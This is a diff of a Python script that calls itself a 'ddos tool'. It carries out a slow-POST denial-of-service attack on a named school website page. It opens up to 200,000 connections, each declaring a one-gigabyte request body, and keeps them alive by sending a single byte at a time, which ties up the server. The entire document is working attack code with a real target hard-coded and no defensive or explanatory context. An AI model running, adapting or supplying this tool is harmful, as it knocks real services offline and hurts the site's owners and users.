@@ -2,53 +2,50 @@ import socket
 import time
 import threading
 
-MAX_CONN = 30000
+#Pressure Test,ddos tool
+#---------------------------
+MAX_CONN=200000
+PORT=80
+HOST = "www.wenyuanzx.cn"
+PAGE = "/Col/Col6/Index.aspx"
+#---------------------------
 
-Port = 80
-Host = "www.wenyuanzx.cn"
-Page = "/Col/Col6/Index.aspx"
+buf=("POST %s HTTP/1.1\r\n"
+"Host: %s\r\n"
+"Content-Length: 1000000000\r\n"
+"Cookie: dklkt_dos_test\r\n"
+"\r\n" % (PAGE,HOST))
+socks=[]
 
-buf = ("POST %s HTTP/1.1\r\n"
-       "HOST %s\r\n"
-       "Content-Length: 10000\r\n"
-       "Cookie: dklkt_dos_test\r\n"
-       "\r\n" % (Host, Page))
-socks = []
+def conn_thread():
+	global socks
+	for i in range(0,MAX_CONN):
+		s=socket.socket	(socket.AF_INET,socket.SOCK_STREAM)
+		try:
+			s.connect((HOST,PORT))
+			s.send(buf)
+			print "[+] Send buf OK!,conn=%d\n"%i
+			socks.append(s)
+		except Exception,ex:
+			print "[-] Could not connect to server or send error:%s"%ex
+			time.sleep(2)
+#end def
 
+def send_thread():
+	global socks
+	while True:
+		for s in socks:
+			try:
+				s.send("f")
+				print "[+] send OK! %s"%s
+			except Exception,ex:
+				print "[-] send Exception:%s\n"%ex
+				socks.remove(s)
+				s.close()
+		time.sleep(1)
+#end def
 
-def ConnectThread():
-    global socks
-    while len(socks) < MAX_CONN:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((Host, Page))
-            s.send(buf.encode('utf-8'))
-            socks.append(s)
-        except:
-            print('Error1')
-            time.sleep(2)
-
-
-def SendThread():
-    global socks
-    while True:
-        for s in socks:
-            try:
-                s.send("f".encode('utf-8'))
-            except:
-                print('Error2')
-                socks.remove(s)
-                s.close()
-                time.sleep(2)
-
-
-if __name__ == "__main__":
-    conn_th = threading.Thread(target=ConnectThread, args=())
-    send_th = threading.Thread(target=SendThread, args=())
-
-    conn_th.start()
-    send_th.start()
-
-    while True:
-        print("%d" % len(socks))
-        time.sleep(1)
+conn_th=threading.Thread(target=conn_thread,args=())
+send_th=threading.Thread(target=send_thread,args=())
+conn_th.start()
+send_th.start()
